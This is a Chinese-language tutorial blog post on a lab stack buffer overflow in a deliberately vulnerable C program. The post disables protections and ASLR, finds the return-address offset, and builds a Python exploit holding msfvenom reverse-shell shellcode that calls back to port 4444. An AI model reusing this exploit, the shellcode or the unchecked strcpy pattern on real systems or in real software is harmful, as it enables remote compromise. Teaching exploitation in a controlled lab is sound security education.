---
layout: post
title: "Linux Simple Stack overflow"
---

#### 环境准备 ####

环境： kaili 2017.2 64位

工具： peda

简单的漏洞程序：

    #include <stdio.h>
    #include <string.h>
    
    void my_func(char *buff) {
    	char msg[256];
    	strcpy(msg, buff);
    }
    
    int main(int argc, char *argv[]) {
    	my_func(argv[1]);
    	return 0;   
    }

编译：

	gcc -g -fno-stack-protector -z execstack -o vul stack.c

关闭ASLR

	echo 0 > /proc/sys/kernel/randomize_va_space

通过peda的checksec可以查看我们加载程序启用了那些[安全机制](https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/)。

其他一些安全机制的控制：

- NX：`-z execstack / -z noexecstack` (关闭 / 开启)
- Canary：`-fno-stack-protector /-fstack-protector / -fstack-protector-all` (关闭 / 开启 / 全开启)
- PIE：`-no-pie / -pie` (关闭 / 开启)
- RELRO：`-z norelro / -z lazy / -z now` (关闭 / 部分开启 / 完全开启)

#### 0x00 漏洞原理 ####

由于用户的输入没有做长度控制，导致覆盖了栈上函数调用时的返回地址，在函数调用结束时`ret`指令的调用，控制了EIP从而导致任意指令执行，本次实例关闭了所有的安全机制为理想情况。

熟悉这个漏洞最关键的一点，熟悉栈的内存布局：

<pre>low addr +-->  +-------------------+
               |     .........     |
               +-------------------+
               |                   |
      ^        |                   |
      |        |                   |
      |        |                   |
      |        |                   |
      |        +-------------------+
      |        |      msg[256]     |
      |        +-------------------+
      |        |     saved EBP     |
      |        +-------------------+
      |        |    return addr    |
               +-------------------+ <--- call my_func
               |    arg0=argv[1]   |
               +-------------------+
               |     .........     |
high addr +--> +-------------------+</pre>

在上图中，可以看到进入`my_func`中时本地变量`msg[256]`的位置，在`my_func`函数中会使用不安全的函数`strcpy`，将用户的输入写入本地变量`msg`中，如果数据过长会覆盖`saved EBP`和`return addr`,这样就导致了函数返回地址被劫持，产生漏洞

#### 0x01 漏洞触发和利用 ####

核心思路为：

- 识别到漏洞点
- 找到偏移量
- 找到跳转地址
- shellcode

通过`gdb`加载漏洞程序`vul`,首先查看安全机制的开启情况：

![sov]({{ '/images/201803/sov_1_1.png' | prepend: site.baseurl }})

设置参数开始运行程序,由于我们看到msg本身为256长度的数组，我们设置我们的paylaod长度为300测试看是否能触发漏洞

![sov]({{ '/images/201803/sov_1_2.png' | prepend: site.baseurl }})

发生异常，此时执行的指令为`ret`(会将栈顶的数据放入EIP中)，此时查看`rsp`发现此时栈顶的数据为`0x41414141`

![sov]({{ '/images/201803/sov_1_3.png' | prepend: site.baseurl }})

我们使用`peda`内置的`pattern_create`和`pattern_offset`工具来寻找准确的偏移

![sov]({{ '/images/201803/sov_1_4.png' | prepend: site.baseurl }})
![sov]({{ '/images/201803/sov_1_5.png' | prepend: site.baseurl }})

我们确定了准确的偏移为264， 确定了偏移后我们要找到一个跳转的地址指向我们的payload， 我们这里简化直接通过gdb调试查看栈的地址(我们关闭了各种安全机制，所以这里地址不会变化)，可以发现在strcpy的参数中可以看到位置`0x7fffffffde80`就是`msg`的栈地址

![sov]({{ '/images/201803/sov_1_6.png' | prepend: site.baseurl }})

现在找到了跳转地址，还缺最后的shellcode，我们直接使用`msfvenom`来生成一个反向shell

	msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f python


所有都已经准备好，写一个简单的python脚本来整合我们所有的东西

<pre>#!/usr/bin/python
import struct

# msf reverse shell
shellcode =  ""  
shellcode += "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
shellcode += "\xef\xff\xff\xff\x48\xbb\xd1\x6b\x1d\x16\x26\x86\x6e"
shellcode += "\xc3\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
shellcode += "\xbb\x42\x45\x8f\x4c\x84\x31\xa9\xd0\x35\x12\x13\x6e"
shellcode += "\x11\x26\x7a\xd3\x6b\x0c\x4a\x59\x86\x6e\xc2\x80\x23"
shellcode += "\x94\xf0\x4c\x96\x34\xa9\xfb\x33\x12\x13\x4c\x85\x30"
shellcode += "\x8b\x2e\xa5\x77\x37\x7e\x89\x6b\xb6\x27\x01\x26\x4e"
shellcode += "\xbf\xce\xd5\xec\xb3\x02\x73\x39\x55\xee\x6e\x90\x99"
shellcode += "\xe2\xfa\x44\x71\xce\xe7\x25\xde\x6e\x1d\x16\x26\x86"
shellcode += "\x6e\xc3"

payload_len = 264 
nop_len = 20
shell_len = len(shellcode)
padding_len = payload_len - nop_len - shell_len
return_addr = struct.pack("<Q", 0x7fffffffde80)

nop = "\x90"*nop_len
padding = "B"*padding_len

print nop + shellcode + padding + return_addr</pre>

所有都准备好后，重新加载我们的payload

	gdb-peda$ r `python exp.py`

另外一个终端，成功接收到shell

![sov]({{ '/images/201803/sov_1_7.png' | prepend: site.baseurl }})

至此入门级别的stack buffoverflow漏洞利用结束

#### 0x02 总结 ####

目前这样的漏洞只能存在实验环境，适合做入门了解，真实的漏洞利用会相当复杂。 

KEEP GOING!!!


参考：

https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/
